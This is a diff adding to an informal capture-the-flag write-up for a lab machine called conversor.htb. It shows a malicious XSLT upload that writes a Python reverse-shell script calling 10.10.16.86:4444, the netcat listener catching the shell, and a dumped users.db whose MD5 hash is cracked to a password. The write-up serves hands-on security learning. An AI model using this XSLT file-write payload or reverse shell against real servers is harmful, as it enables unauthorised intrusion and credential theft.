@@ -96,4 +96,69 @@ we go to login, then we find we need to register, all simple, we registser using
 then after logging in we see the converter page
 we see a XML & XSLT File upload, with some example files provided we can see that there an nmap results output, very cool again, 
 
-initial we did not see the download link on the about page which would have saved us some time, but we knew the exploit would most likely lie in the uploading of documents, 
+initial we did not see the download link on the about page which would have saved us some time, but we knew the exploit would most likely lie in the uploading of documents, we knew of a earlier machine that had a similar exploit, 
+
+so we use this cat rce.xslt 
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet
+        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+    xmlns:ptswarm="http://exslt.org/common"
+    extension-element-prefixes="ptswarm"
+    version="1.0">
+<xsl:template match="/">
+  <ptswarm:document href="/var/www/conversor.htb/scripts/test2.py" method="text">
+import os
+
+os.system(
+    "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.16.86\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])'"
+)
+  </ptswarm:document>
+</xsl:template>
+</xsl:stylesheet>
+
+
+in which we will use a NC revshell to catch the shell, 
+ nc -lvnp 4444      
+listening on [any] 4444 ...
+connect to [10.10.16.86] from (UNKNOWN) [10.129.5.50] 42404
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+conversor.htb
+
+
+after uploading we get this, an unstable shell, awesome!
+
+we start exploring the shell 
+
+$ cd home $ ls fismathack $ cd fismathack /bin/sh: 81: cd: can't cd to fismathack $ cat fismathack cat: fismathack: Permission denied $ ls fismathack $
+
+as you can see here there is a user named fismathack, so okay we write that down,
+
+then cd into 
+conversor.htb -> instance -> users.db 
+
+cat users.db
+�7����0�?tablefilesfilesCREATE TABLE files (
+        id TEXT PRIMARY KEY,
+        user_id INTEGER,
+        filename TEXT,
+        FOREIGN KEY(user_id) REFERENCES users(id)
+    ))=indexsqlite_autoindex_files_1filesP++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��tableusersusersCREATE TABLE users (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        username TEXT UNIQUE,
+        password TEXT
+���zV'M----c51c1b797185ce515d93268a116811c9.!Mfismathack5b5c3ac3a1c897c94caad48e6c71fdec
+����---- usersthack
+
+
+here we see an interesting line  !Mfismathack5b5c3ac3a1c897c94caad48e6c71fdec
+
+
+again the user fismathack appears and so does a hashed password, 5b5c3ac3a1c897c94caad48e6c71fdec -> MD5 
+
+originally this took us some time in recognizing what we had seen, we didnt see this originally and didnt recognize the md5 hash, we convert it using a simple MD5 hash cracker, Free Password Hash Cracker
+crackstation . com -> 5b5c3ac3a1c897c94caad48e6c71fdec -> Keepmesafeandwarm
+
+
+boom now we have the user fismathack and their password Keepmesafeandwarm
+
